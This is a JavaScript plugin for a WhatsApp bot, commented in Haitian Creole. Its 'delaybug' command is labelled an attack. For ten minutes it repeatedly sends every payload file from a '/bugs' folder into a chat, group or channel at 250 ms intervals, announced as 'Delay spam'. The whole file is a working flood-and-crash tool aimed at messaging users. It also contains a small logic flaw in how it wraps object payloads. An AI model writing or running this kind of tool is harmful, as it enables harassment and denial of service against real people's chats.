const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'delaybug',
  desc: '💥 Atak ak delay pou 10 minit sou chat/group/channel',
  category: 'bug',
  react: '☠️',
  filename: __filename
}, async (bot, mek, m, { from, reply, isGroup }) => {
  try {
    const isPrivate = !isGroup && from.endsWith('@s.whatsapp.net');
    const isChannel = from.endsWith('@broadcast');

    if (!isGroup && !isPrivate && !isChannel) {
      return await reply('❌ Chat pa sipòte.');
    }

    const chatType = isGroup ? 'Group' : isChannel ? 'Channel' : 'Private';
    const bugsFolder = path.join(__dirname, '../bugs');
    const payloadFiles = fs.readdirSync(bugsFolder).filter(f => f.endsWith('.js'));

    if (payloadFiles.length === 0) {
      return await reply('📂 Pa gen payload nan folder `/bugs`.');
    }

    const imgPath = path.join(__dirname, '../media/5.png');
    const imgBuf = fs.readFileSync(imgPath);

    await bot.sendMessage(from, {
      image: imgBuf,
      caption: `🚨 *Delaybug started*\n📌 Type: ${chatType}\n🕒 Duration: 10 minutes\n📦 Payloads: ${payloadFiles.length}\n🚀 Mode: Delay spam`
    }, { quoted: mek });

    const endTime = Date.now() + 10 * 60 * 1000;

    while (Date.now() < endTime) {
      for (const file of payloadFiles) {
        try {
          const bugPath = path.join(bugsFolder, file);
          delete require.cache[require.resolve(bugPath)];
          let payload = require(bugPath);

          if (typeof payload === 'object' && typeof payload.default === 'string') {
            payload = async (bot, from) => {
              await bot.sendMessage(from, { text: payload.default });
            };
          }

          if (typeof payload === 'string') {
            const text = payload;
            payload = async (bot, from) => {
              await bot.sendMessage(from, { text });
            };
          }

          if (typeof payload === 'function') {
            await payload(bot, from);
          }

        } catch (err) {
          console.error(`❌ Payload error (${file}):`, err.message);
        }

        await new Promise(res => setTimeout(res, 250)); // delay 250ms ant chak payload
      }
    }

    await reply(`✅ *Delaybug completed* on ${chatType}`);

  } catch (err) {
    console.error(err);
    await reply(`❌ Error: ${err.message}`);
  }
});